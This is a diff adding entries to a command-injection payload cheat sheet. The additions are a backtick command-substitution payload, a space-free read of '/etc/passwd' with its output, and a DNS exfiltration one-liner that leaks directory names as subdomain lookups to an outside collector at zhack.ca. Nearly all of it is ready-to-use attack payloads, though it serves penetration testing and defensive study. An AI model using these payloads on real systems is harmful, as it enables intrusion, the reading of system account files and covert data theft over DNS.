@@ -17,10 +17,14 @@ Code execution by chaining commands
 original_cmd_by_server; ls
 original_cmd_by_server && ls
 original_cmd_by_server | ls
+original_cmd_by_server `ls`
 ```
 
 Code execution without space - Linux
 ```
+swissky@crashlab:~/Www$ cat</etc/passwd
+root:x:0:0:root:/root:/bin/bash
+
 swissky@crashlab▸ ~ ▸ $ {cat,/etc/passwd}
 root:x:0:0:root:/root:/bin/bash
 daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
@@ -58,6 +62,15 @@ swissky@crashlab▸ ~ ▸ $ time if [ $(whoami|cut -c 1) == a ]; then sleep 5; f
 real	0m0.002s
 user	0m0.000s
 sys	0m0.000s
+```
+
+
+## DNS based data exfiltration
+Based on the tool from https://github.com/HoLyVieR/dnsbin also hosted at dnsbin.zhack.ca
+```
+1. Go to http://dnsbin.zhack.ca/
+2. Execute a simple 'ls'
+for i in $(ls /) ; do host "http://$i.3a43c7e4e57a8d0e2057.d.zhack.ca"; done
 ```
 
 ## Environment based
